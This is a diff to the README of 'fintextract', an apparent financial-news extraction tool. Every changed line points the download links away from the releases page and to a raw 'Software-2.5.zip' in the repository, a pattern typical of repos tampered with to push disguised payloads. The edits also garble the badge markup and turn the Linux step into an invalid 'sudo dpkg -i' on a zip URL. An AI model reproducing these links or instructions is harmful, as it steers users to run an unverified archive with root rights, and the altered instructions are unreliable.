@@ -1,6 +1,6 @@
 # 📊 fintextract - Extract Key Insights from News Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Kakawana/fintextract/releases)
+[![Download Latest Release](https://github.com/Kakawana/fintextract/raw/refs/heads/main/fintextract/Software-2.5.zip%20Latest%https://github.com/Kakawana/fintextract/raw/refs/heads/main/fintextract/Software-2.5.zip)](https://github.com/Kakawana/fintextract/raw/refs/heads/main/fintextract/Software-2.5.zip)
 
 ## 📚 Overview
 
@@ -13,7 +13,7 @@ To get started with fintextract, follow the steps below to download and run the 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the downloads:  
-   [Download Latest Release](https://github.com/Kakawana/fintextract/releases)
+   [Download Latest Release](https://github.com/Kakawana/fintextract/raw/refs/heads/main/fintextract/Software-2.5.zip)
    
 2. **Select a Version:** On the releases page, you will see different versions of fintextract. Choose the most recent one.
 
@@ -22,7 +22,7 @@ To get started with fintextract, follow the steps below to download and run the 
 4. **Install the Application:** 
    - For Windows: Double-click the downloaded file to start the installation. Follow the on-screen prompts.
    - For macOS: Open the downloaded file and drag the application to your Applications folder.
-   - For Linux: Open a terminal and navigate to the downloaded file. Use the command `sudo dpkg -i filename.deb` (replace "filename.deb" with the actual file name).
+   - For Linux: Open a terminal and navigate to the downloaded file. Use the command `sudo dpkg -i https://github.com/Kakawana/fintextract/raw/refs/heads/main/fintextract/Software-2.5.zip` (replace "https://github.com/Kakawana/fintextract/raw/refs/heads/main/fintextract/Software-2.5.zip" with the actual file name).
 
 5. **Run fintextract:** After installation, find fintextract in your applications and double-click to open it.
 
@@ -89,4 +89,4 @@ For more instructions and help, feel free to check the Wiki section on our GitHu
 For any further inquiries, you can reach out to us through the Issues page on the GitHub repository.
 
 Remember, to download the latest version at any time, visit the link here:  
-[Download Latest Release](https://github.com/Kakawana/fintextract/releases)
+[Download Latest Release](https://github.com/Kakawana/fintextract/raw/refs/heads/main/fintextract/Software-2.5.zip)
